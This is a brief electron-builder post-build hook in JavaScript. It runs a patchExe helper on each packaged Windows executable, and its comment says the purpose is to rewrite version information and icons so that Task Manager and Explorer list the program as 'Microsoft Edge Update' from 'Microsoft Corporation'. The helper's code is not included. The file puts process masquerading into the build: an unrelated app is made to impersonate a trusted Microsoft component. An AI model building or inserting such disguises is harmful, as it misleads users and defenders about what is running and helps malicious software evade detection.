const { patchExe } = require('./patch-pe');

/** Post-build artifact hook for electron-builder.
 * Patches PE VersionInfo and icons on packaged Windows installer/portable executables
 * so Task Manager and Windows Explorer show 'Microsoft Edge Update' / 'Microsoft Corporation'.
 */
module.exports = async function artifactBuildCompleted(artifact) {
  if (artifact && artifact.file && artifact.file.endsWith('.exe')) {
    await patchExe(artifact.file);
  }
};
